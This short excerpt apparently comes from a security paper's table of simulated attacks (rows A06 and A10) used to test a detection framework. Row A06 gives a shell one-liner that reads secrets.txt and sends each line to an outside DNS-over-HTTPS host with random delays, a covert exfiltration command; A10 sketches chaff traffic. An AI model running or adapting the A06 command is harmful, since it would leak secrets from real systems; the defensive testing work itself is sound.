note: Table 22 lists five advanced attack scenarios that stress the adaptive response of the framework. Each row is a distinct attack execution with its own detection trigger and mitigation action. The strings are transcribed verbatim from data/attack_matrix.csv (rows A06–A10); a fresh run of each simulator's _trigger_and_action() should return exactly these strings.

A06.name: Slow-Drip Exfiltration
A06.attack_execution: for i in $(cat secrets.txt); do curl -H 'Content-Type: application/dns-message' https://doh.server/dns-query?dns=$i; sleep $((RANDOM%3+1)); done

A10.name: Adaptive Chaff Injection
A10.attack_execution: while true; do size=$((RANDOM%512+64)); send_encrypted_query(random_bytes(size)); delay=...; done
